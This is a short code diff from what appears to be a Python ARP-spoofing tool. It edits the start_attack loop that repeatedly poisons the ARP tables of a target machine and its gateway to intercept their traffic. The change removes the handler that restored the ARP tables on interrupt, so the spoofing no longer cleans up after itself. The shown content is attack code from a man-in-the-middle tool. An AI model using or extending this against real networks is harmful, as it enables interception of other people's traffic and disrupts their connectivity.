@@ -83,15 +83,12 @@ def start_attack(target_ip, gateway_ip):
         return
     count = 0
     while True:
-        try:
-            print("\n[+] Spoofing ARP table of " + target_ip + " to " + gateway_ip)
-            spoof_arp_table(target_ip, target_mac, gateway_ip)
-            spoof_arp_table(gateway_ip, gateway_mac, target_ip)
-            count += 1
-            print("\r[+] Packets sent: " + str(count), end="")
-            time.sleep(1)
-        except KeyboardInterrupt:
-            print("[+] Restoring ARP table of " + target_ip + " to " + gateway_ip)
+        print("\n[+] Spoofing ARP table of " + target_ip + " to " + gateway_ip)
+        spoof_arp_table(target_ip, target_mac, gateway_ip)
+        spoof_arp_table(gateway_ip, gateway_mac, target_ip)
+        count += 1
+        print("\r[+] Packets sent: " + str(count), end="")
+        time.sleep(1)
 
 
 # if option.all:
